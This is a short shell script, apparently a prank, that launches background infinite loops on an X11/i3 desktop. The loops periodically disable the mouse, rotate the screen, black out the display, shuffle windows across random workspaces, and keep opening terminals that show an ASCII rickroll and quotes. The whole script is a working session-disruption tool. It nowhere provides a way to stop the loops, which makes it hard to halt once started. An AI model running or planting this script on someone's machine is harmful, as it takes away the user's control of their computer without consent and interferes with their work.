#!/bin/sh
while (true); do mouse=($(xinput | grep Mouse | cut -d = -f2 | cut -d [ -f1)); xinput disable $mouse; sleep 3; xinput enable $mouse; sleep 15; done &
while (true); do for i in {2,0}; do xrandr -o $i && sleep 30; done && sleep 120; done &
while (true); do monitor=$(xrandr | awk '/\yconnected\y/{print $1}'); for i in {0,1,2}; do xrandr --output $monitor --brightness 0; sleep 7; done && sleep 65; done &
while (true); do i3-msg move container to workspace number $(( (RANDOM % 10) + 1 )); sleep 32; done &
while (true); do monitor=$(xrandr | awk '/\yconnected\y/{print $1}'); xrandr --output $monitor --brightness 100; sleep 10; done &
while (true); do for i in {1,2,3,4,6,5,7,10,9,8}; do i3-msg workspace number $i; alacritty -e curl ascii.live/rick & sleep 0.5; done && sleep 142; done &
while (true); do alacritty -e curl -L ascii.getfdn.com/epiquote; sleep 14; done &
while (true); do i3-msg floating toggle; sleep 12; done &
